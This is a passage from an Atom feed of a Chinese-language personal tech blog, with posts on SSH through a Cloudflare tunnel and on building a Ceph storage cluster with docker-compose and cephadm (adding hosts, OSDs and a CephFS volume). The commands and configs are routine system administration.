my-ssh.xxx.ltd 為此次 tunnel 的位置&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Host my-ssh.xxx.ltd
ProxyCommand /usr/local/bin/cloudflared access ssh --hostname %h
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;連線成功&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218111840.png&quot; alt=&quot;Pasted image 20251218111840.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;切換網路到外網環境&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218111902.png&quot; alt=&quot;Pasted image 20251218111902.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;一樣是可以連線到 &lt;code&gt;my-ssh.xxx.ltd&lt;/code&gt; 的 ssh 機器&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218111922.png&quot; alt=&quot;Pasted image 20251218111922.png&quot; /&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/other/Cloudflare tunnel 研究/" >
        </entry>
        <entry>
            <title>
                搭建 Ceph cluster
                
            </title>
            <updated>2025-12-25T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/ceph/搭建 Ceph cluster/</id>
            <content type="html">
                &lt;h2 id=&quot;前言&quot; tabindex=&quot;-1&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;在眾多搭建 ceph 的方法中，最適合 POC 測試的就是用 docker 搭建 ceph 集群，如果是生產環境，可以使用官方推薦的 cephadm 或是 ceph-ansible。&lt;/p&gt;
&lt;h2 id=&quot;目的&quot; tabindex=&quot;-1&quot;&gt;目的&lt;/h2&gt;
&lt;p&gt;用 Docker 建立 ceph cluster，並且支援 aws S3 儲存 API 以及 cephfs&lt;/p&gt;
&lt;h2 id=&quot;環境準備&quot; tabindex=&quot;-1&quot;&gt;環境準備&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;os: ubuntu&lt;/li&gt;
&lt;li&gt;一台有安裝 docker 的電腦&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;節點角色解釋&quot; tabindex=&quot;-1&quot;&gt;節點角色解釋&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;MON（Monitor 節點）
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;負責存儲集群的核心數據，例如集群狀態、配置、訪問權限等。&lt;/li&gt;
&lt;li&gt;提供其他節點（OSD、MGR 等）與客戶端的集群狀態信息。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;用途&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;是 Ceph 集群的基礎，沒有 MON 節點，集群無法正常運作。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;節點失效情況 :
&lt;ul&gt;
&lt;li&gt;無法讀寫資料&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;OSD（Object Storage Daemon 節點）
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;負責實際存儲數據，並管理數據副本的一致性。&lt;/li&gt;
&lt;li&gt;根據 CRUSH 算法決定數據應存放的物理位置。&lt;/li&gt;
&lt;li&gt;提供數據讀取與寫入服務，並定期回報狀態給 MON。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;用途&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;Ceph 中的數據存儲骨幹，所有的物件數據都存放在 OSD 中。&lt;/li&gt;
&lt;li&gt;通常一個 OSD 容器或 Process 對應一個物理磁碟。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;節點失效情況 :
&lt;ul&gt;
&lt;li&gt;如果 data pool 內的資料沒有設定 replica，在該 OSD 上的資料會有遺失風險&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;MGR（Manager 節點）
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;提供集群的內部狀態監控&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;用途&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;確保集群監控與健康狀態的即時性。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;節點失效情況 :
&lt;ul&gt;
&lt;li&gt;因為無法正常管理 OSD 節點加入與移除，無法掛載 cephfs，整體集群無法訪問&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;RGW（RADOS Gateway 節點）
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;為 Ceph 提供對象存儲服務的接口，兼容 S3 和 Swift 協議。&lt;/li&gt;
&lt;li&gt;管理存儲桶（bucket）與對象，用於存儲環境的數據操作。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;用途&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;用於提供對象存儲功能，類似於 AWS S3 的操作方式。&lt;/li&gt;
&lt;li&gt;支援數據訪問的多租戶模式（multi-tenancy）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;節點失效情況 :
&lt;ul&gt;
&lt;li&gt;應用程式無法使用 S3 API 存取資料，但不會有資料遺失風險&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;MDS (metadata server) 節點
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;為 Ceph 提供 NFS 接口。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;用途&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;處理 node 掛載請求&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;節點失效情況 :
&lt;ul&gt;
&lt;li&gt;應用程式無法掛載 NFS 資料夾，導致應用程式無法存取資料，但資料沒有遺失風險&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;demo&quot; tabindex=&quot;-1&quot;&gt;Demo&lt;/h2&gt;
&lt;p&gt;docker-compose.yaml&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;version: &#39;3.9&#39;

services:
  ceph-mon:
    image: ceph/daemon:latest-luminous
    container_name: ceph-mon
    environment:
      - CLUSTER=ceph
      - WEIGHT=1.0
      - MON_IP=192.168.1.55
      - MON_NAME=ceph-mon
      - CEPH_PUBLIC_NETWORK=0.0.0.0/0
    network_mode: &amp;quot;host&amp;quot;
    volumes:
      - /etc/ceph:/etc/ceph
      - /var/lib/ceph:/var/lib/ceph
      - /var/log/ceph:/var/log/ceph
    ports:
      - &amp;quot;6789:6789&amp;quot;
    restart: unless-stopped
    command: mon

  ceph-mgr:
    image: ceph/daemon:latest-luminous
    container_name: ceph-mgr
    privileged: true
    environment:
      - CLUSTER=ceph
    network_mode: &amp;quot;host&amp;quot;
    depends_on:
      - ceph-mon
    pid: &amp;quot;container:ceph-mon&amp;quot;
    volumes:
      - /etc/ceph:/etc/ceph
      - /var/lib/ceph:/var/lib/ceph
    ports:
      - &amp;quot;7000:7000&amp;quot;
    restart: unless-stopped
    command: mgr

  ceph-mds:
    image: ceph/daemon:latest-luminous
    container_name: ceph-mds
    privileged: true
    environment:
      - CLUSTER=ceph
      - CEPHFS_CREATE=1
    network_mode: &amp;quot;host&amp;quot;
    depends_on:
      - ceph-mon
    pid: &amp;quot;container:ceph-mon&amp;quot;
    volumes:
      - /etc/ceph:/etc/ceph
      - /var/lib/ceph:/var/lib/ceph
    restart: unless-stopped
    command: mds

  ceph-osd-1:
    image: ceph/daemon:latest-luminous
    container_name: ceph-osd-1
    privileged: true
    environment:
      - CLUSTER=ceph
      - WEIGHT=1.0
      - MON_NAME=ceph-mon
      - MON_IP=127.0.0.1
      - OSD_TYPE=directory
    network_mode: &amp;quot;host&amp;quot;
    depends_on:
      - ceph-mon
    volumes:
      - /etc/ceph:/etc/ceph
      - /var/lib/ceph:/var/lib/ceph
      - /var/lib/ceph/osd/1:/var/lib/ceph/osd
      - /etc/localtime:/etc/localtime:ro
    restart: unless-stopped
    command: osd

  ceph-osd-2:
    image: ceph/daemon:latest-luminous
    container_name: ceph-osd-2
    privileged: true
    environment:
      - CLUSTER=ceph
      - WEIGHT=1.0
      - MON_NAME=ceph-mon
      - MON_IP=127.0.0.1
      - OSD_TYPE=directory
    network_mode: &amp;quot;host&amp;quot;
    depends_on:
      - ceph-mon
    volumes:
      - /etc/ceph:/etc/ceph
      - /var/lib/ceph:/var/lib/ceph
      - /var/lib/ceph/osd/2:/var/lib/ceph/osd
      - /etc/localtime:/etc/localtime:ro
    restart: unless-stopped
    command: osd

  ceph-osd-3:
    image: ceph/daemon:latest-luminous
    container_name: ceph-osd-3
    privileged: true
    environment:
      - CLUSTER=ceph
      - WEIGHT=1.0
      - MON_NAME=ceph-mon
      - MON_IP=127.0.0.1
      - OSD_TYPE=directory
    network_mode: &amp;quot;host&amp;quot;
    depends_on:
      - ceph-mon
    volumes:
      - /etc/ceph:/etc/ceph
      - /var/lib/ceph:/var/lib/ceph
      - /var/lib/ceph/osd/3:/var/lib/ceph/osd
      - /etc/localtime:/etc/localtime:ro
    restart: unless-stopped
    command: osd
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;建立 osd 節點的 token&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker exec ceph-mon ceph auth get client.bootstrap-osd -o /var/lib/ceph/bootstrap-osd/ceph.keyring
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;修改設定檔以支援 etx4 硬碟&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo vi /etc/ceph/ceph.conf
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在文件末尾添加&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;osd max object name len = 256
osd max object namespace len = 64
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;osd&quot; tabindex=&quot;-1&quot;&gt;啟動 osd 節點&lt;/h2&gt;
&lt;p&gt;因為寫入 OSD 需要過半數才能算是寫入成功，如果寫入的 OSD 數量未達「最少寫入共識」就會停止這次寫入，如果持續發生寫入失敗 Ceph 集群就會 crash，而「允許離線數量」表達的是在目前「OSD 數量」下，可以允許最多幾個 OSD 節點下線&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;OSD 數量&lt;/th&gt;
&lt;th&gt;最少寫入共識&lt;/th&gt;
&lt;th&gt;允許離線數量&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;所以建議最佳 OSD 數量為 3 或 5 個。&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&quot;ceph&quot; tabindex=&quot;-1&quot;&gt;查看 Ceph 狀態&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;$ sudo ceph status
  cluster:
    id:     f84157cf-dd8e-497b-b8f3-fbc2f597eed2
    health: HEALTH_WARN
            46/69 objects misplaced (66.667%)

  services:
    mon: 1 daemons, quorum ceph-mon
    mgr: jason-loges(active)
    mds: cephfs-1/1/1 up  {0=jason-loges=up:active}
    osd: 3 osds: 3 up, 3 in; 192 remapped pgs

  data:
    pools:   2 pools, 192 pgs
    objects: 23 objects, 139KiB
    usage:   24.2GiB used, 62.5GiB / 86.7GiB avail
    pgs:     46/69 objects misplaced (66.667%)
             192 active+clean+remapped
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241127102210.png&quot; alt=&quot;Pasted image 20241127102210.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;使用 docker ps 查看 ceph 運行狀態&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241127102231.png&quot; alt=&quot;Pasted image 20241127102231.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;ref: &lt;a href=&quot;https://blog.csdn.net/aslifeih/article/details/135140411&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://blog.csdn.net/aslifeih/article/details/135140411&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;環境清理&quot; tabindex=&quot;-1&quot;&gt;環境清理&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;$ rm -r /etc/ceph
$ rm -r /var/lib/ceph/
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;next&quot; tabindex=&quot;-1&quot;&gt;Next&lt;/h2&gt;
&lt;p&gt;&lt;a class=&quot;internal-link&quot; target=&quot;&quot; data-note-icon=&quot;&quot; href=&quot;https://hung-jia-jun.github.io/%E6%8A%80%E8%A1%93%E6%96%87%E4%BB%B6/ceph/Ceph%20cluster%20%E8%B3%87%E6%96%99%E5%AF%AB%E5%85%A5%E7%AF%87%20-%20ceph%20S3/&quot;&gt;Ceph cluster 資料寫入篇 - ceph S3&lt;/a&gt;&lt;br /&gt;
&lt;a class=&quot;internal-link&quot; target=&quot;&quot; data-note-icon=&quot;&quot; href=&quot;https://hung-jia-jun.github.io/%E6%8A%80%E8%A1%93%E6%96%87%E4%BB%B6/ceph/Ceph%20cluster%20%E8%B3%87%E6%96%99%E5%AF%AB%E5%85%A5%E7%AF%87%20-%20RBD/&quot;&gt;Ceph cluster 資料寫入篇 - RBD&lt;/a&gt;&lt;br /&gt;
&lt;a class=&quot;internal-link&quot; target=&quot;&quot; data-note-icon=&quot;&quot; href=&quot;https://hung-jia-jun.github.io/%E6%8A%80%E8%A1%93%E6%96%87%E4%BB%B6/ceph/Ceph%20cluster%20%E8%B3%87%E6%96%99%E5%AF%AB%E5%85%A5%E7%AF%87%20-%20CephFS/&quot;&gt;Ceph cluster 資料寫入篇 - CephFS&lt;/a&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/ceph/搭建 Ceph cluster/" >
        </entry>
        <entry>
            <title>
                cephadm 搭建 ceph 集群
                
            </title>
            <updated>2025-12-29T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/ceph/cephadm/cephadm 搭建 ceph 集群/</id>
            <content type="html">
                &lt;h2 id=&quot;firewall&quot; tabindex=&quot;-1&quot;&gt;Firewall&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Entity&lt;/th&gt;
&lt;th&gt;Port&lt;/th&gt;
&lt;th&gt;direction&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;ceph-cluster-01、ceph-cluster-02、ceph-cluster-03&lt;/td&gt;
&lt;td&gt;8443&lt;/td&gt;
&lt;td&gt;inbound&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;3300&lt;/td&gt;
&lt;td&gt;inbound&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;6789&lt;/td&gt;
&lt;td&gt;inbound&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;6800~7568&lt;/td&gt;
&lt;td&gt;inbound&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;ref: &lt;a href=&quot;https://docs.ceph.com/en/reef/cephadm/install/#cephadm-deploying-new-cluster&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://docs.ceph.com/en/reef/cephadm/install/#cephadm-deploying-new-cluster&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;前置條件&quot; tabindex=&quot;-1&quot;&gt;前置條件&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;ceph cluster 內，master 機器都可以用 ssh key 登入每台 VM 的 root 用戶&lt;/li&gt;
&lt;li&gt;ceph master 主機需要允許 port  &lt;code&gt;8443&lt;/code&gt;(ceph web ui)&lt;/li&gt;
&lt;li&gt;每台機器都要安裝 docker&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;apt install -y cephadm
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;cephadm add-repo --release reef
cephadm install
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;透過執行&lt;code&gt;which&lt;/code&gt;確認&lt;code&gt;cephadm&lt;/code&gt;現在位於您的 PATH 中&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;which cephadm
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;成功&lt;code&gt;which cephadm&lt;/code&gt;指令將傳回以下內容：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/usr/sbin/cephadm
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;引導 ceph 集群建立&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cephadm bootstrap --mon-ip 10.0.0.2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;登入資訊&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Ceph Dashboard is now available at:

	     URL: https://10.0.0.2:8443/
	    User: admin
	Password: test

You can access the Ceph CLI with:

	sudo /usr/sbin/cephadm shell --fsid a90fc58e-b38f-11ef-b557-732197d2d654 -c /etc/ceph/ceph.conf -k /etc/ceph/ceph.client.admin.keyring
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;打開 dashboard&lt;br /&gt;
&lt;a href=&quot;https://10.0.0.2:8443/&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://10.0.0.2:8443/&lt;/a&gt;&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241206183226.png&quot; alt=&quot;Pasted image 20241206183226.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;進入 cephadm shell&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ cephadm shell

Inferring fsid a90fc58e-b38f-11ef-b557-732197d2d654
Inferring config /var/lib/ceph/a90fc58e-b38f-11ef-b557-732197d2d654/mon.ceph-cluster-01/config
Using recent ceph image quay.io/ceph/ceph@sha256:c08064dde4bba4e72a1f55d90ca32df9ef5aafab82efe2e0a0722444a5aaacca
root@ceph-cluster-01:/# 
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;host-ceph-cluster&quot; tabindex=&quot;-1&quot;&gt;加入 host 到 ceph cluster&lt;/h2&gt;
&lt;p&gt;確認完可以用 ssh key 登入目標主機成為 root 後，就可以新增 ceph node 了&lt;br /&gt;
這邊附上卡住的問題記錄 &lt;a class=&quot;internal-link is-unresolved&quot; href=&quot;https://hung-jia-jun.github.io/404&quot; target=&quot;&quot;&gt;踩坑日記 - 遠端用 SSH key 登入 root 權限問題&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;設定 &lt;code&gt;/etc/hosts&lt;/code&gt;&lt;br /&gt;
每台電腦都要&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# ceph-cluster-01
127.0.1.1 ceph-cluster-01
10.94.1.21 ceph-cluster-02
10.94.1.22 ceph-cluster-03

# ceph-cluster-02
0.94.1.20 ceph-cluster-01
127.0.1.1 ceph-cluster-02
10.94.1.22 ceph-cluster-03

# ceph-cluster-03
10.0.0.2 ceph-cluster-01
10.94.1.21 ceph-cluster-02
127.0.1.1 ceph-cluster-03
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;使用 &lt;code&gt;ceph orch host add&lt;/code&gt;  指令來新增 host&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;test@ceph-cluster-01:~$ sudo cephadm shell ceph orch host add ceph-cluster-02 10.94.1.21

Inferring fsid a90fc58e-b38f-11ef-b557-732197d2d654
Inferring config /var/lib/ceph/a90fc58e-b38f-11ef-b557-732197d2d654/mon.ceph-cluster-01/config
Using recent ceph image quay.io/ceph/ceph@sha256:c08064dde4bba4e72a1f55d90ca32df9ef5aafab82efe2e0a0722444a5aaacca
Added host &#39;ceph-cluster-02&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ceph-cluster-02 身上的 docker container&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251226001117.png&quot; alt=&quot;Pasted image 20251226001117.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;其餘的機器也照同樣的 [[#加入 host 到 ceph cluster]] 流程走&lt;/p&gt;
&lt;p&gt;加上 label 到 master ceph node (介面上就會顯示哪台機器是 master 了)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;test@ceph-cluster-01:~$ sudo ceph orch host label add ceph-cluster-01 master
Added label master to host ceph-cluster-01
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;完成&quot; tabindex=&quot;-1&quot;&gt;完成&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241206184354.png&quot; alt=&quot;Pasted image 20241206184354.png&quot; /&gt;&lt;/p&gt;
&lt;h1 id=&quot;next&quot; tabindex=&quot;-1&quot;&gt;Next&lt;/h1&gt;
&lt;p&gt;&lt;a class=&quot;internal-link&quot; target=&quot;&quot; data-note-icon=&quot;&quot; href=&quot;https://hung-jia-jun.github.io/%E6%8A%80%E8%A1%93%E6%96%87%E4%BB%B6/ceph/cephadm/ceph%20%E6%96%B0%E5%A2%9E%20OSD/&quot;&gt;ceph 新增 OSD&lt;/a&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/ceph/cephadm/cephadm 搭建 ceph 集群/" >
        </entry>
        <entry>
            <title>
                ceph 新增 OSD
                
            </title>
            <updated>2025-12-29T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/ceph/cephadm/ceph 新增 OSD/</id>
            <content type="html">
                &lt;p&gt;確認 orch 服務正常運行&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@ceph-cluster-01:/home/# ceph orch status
Backend: cephadm
Available: True
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;嘗試列出所有可用設備，目前會是空的，因為還沒建立&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ceph orch device ls

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241207225601.png&quot; alt=&quot;Pasted image 20241207225601.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;查看 block，目前只有一個 sda2 給系統使用&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;lsblk -f 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251226000701.png&quot; alt=&quot;Pasted image 20251226000701.png&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;部署要求&quot; tabindex=&quot;-1&quot;&gt;部署要求&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;設備必須沒有分區。&lt;/li&gt;
&lt;li&gt;設備不得具有任何 LVM 狀態。&lt;/li&gt;
&lt;li&gt;不得安裝設備。&lt;/li&gt;
&lt;li&gt;設備不能包含檔案系統。&lt;/li&gt;
&lt;li&gt;設備不得包含 Ceph BlueStore OSD。&lt;/li&gt;
&lt;li&gt;設備必須大於 5 GB。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;es-xi&quot; tabindex=&quot;-1&quot;&gt;ESXi 新增磁碟空間&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241207230318.png&quot; alt=&quot;Pasted image 20241207230318.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;儲存&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251226000720.png&quot; alt=&quot;Pasted image 20251226000720.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;重新開機&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241207230456.png&quot; alt=&quot;Pasted image 20241207230456.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;重新開機後，/dev/sdb 磁碟區出現&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251226000748.png&quot; alt=&quot;Pasted image 20251226000748.png&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;lvm&quot; tabindex=&quot;-1&quot;&gt;建立 LVM 分區&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251226000812.png&quot; alt=&quot;Pasted image 20251226000812.png&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;ceph-device&quot; tabindex=&quot;-1&quot;&gt;Ceph 新增 device&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p DEVICE=&quot;&quot;&gt;ceph orch daemon add osd {HOST_NAME}:&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;只要在 ceph-cluster-01 這台機器輸入 ceph osd daemon 部署指令就好&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@ceph-cluster-01:/home# sudo ceph orch daemon add osd ceph-cluster-02:/dev/ceph-vg/ceph-lv-1
Created osd(s) 0 on host &#39;ceph-cluster-02&#39;

root@ceph-cluster-01:/home# sudo ceph orch daemon add osd ceph-cluster-02:/dev/ceph-vg/ceph-lv-2
Created osd(s) 1 on host &#39;ceph-cluster-02&#39;

root@ceph-cluster-01:/home# sudo ceph orch daemon add osd ceph-cluster-03:/dev/ceph-vg/ceph-lv-3
Created osd(s) 2 on host &#39;ceph-cluster-03&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251226000904.png&quot; alt=&quot;Pasted image 20251226000904.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241210120104.png&quot; alt=&quot;Pasted image 20241210120104.png&quot; /&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/ceph/cephadm/ceph 新增 OSD/" >
        </entry>
        <entry>
            <title>
                ceph 建立 filesystem
                
            </title>
            <updated>2025-12-29T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/ceph/cephadm/ceph 建立 filesystem/</id>
            <content type="html">
                &lt;h1 id=&quot;背景&quot; tabindex=&quot;-1&quot;&gt;背景&lt;/h1&gt;
&lt;p&gt;mds service 需要有一個 datapool，才能將這個 datapool 掛載成 nfs&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[!IMPORTANT]&lt;br /&gt;
以下操作指令只需要在 master 主機完成&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;為了可以使用 cephfs，所以需要先建立 data pool&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ ceph fs volume create cephfs-data
$ ceph fs volume ls
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251226000547.png&quot; alt=&quot;Pasted image 20251226000547.png&quot; /&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[!TIP] Optional&lt;br /&gt;
在 master 主機下指令開啟 datapool 刪除權限&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ceph config set mon mon_allow_pool_delete true&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;p&gt;Pools 介面上長出兩個 pool&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;cephfs.cephfs-data.data
&lt;ul&gt;
&lt;li&gt;存放資料的 pool&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
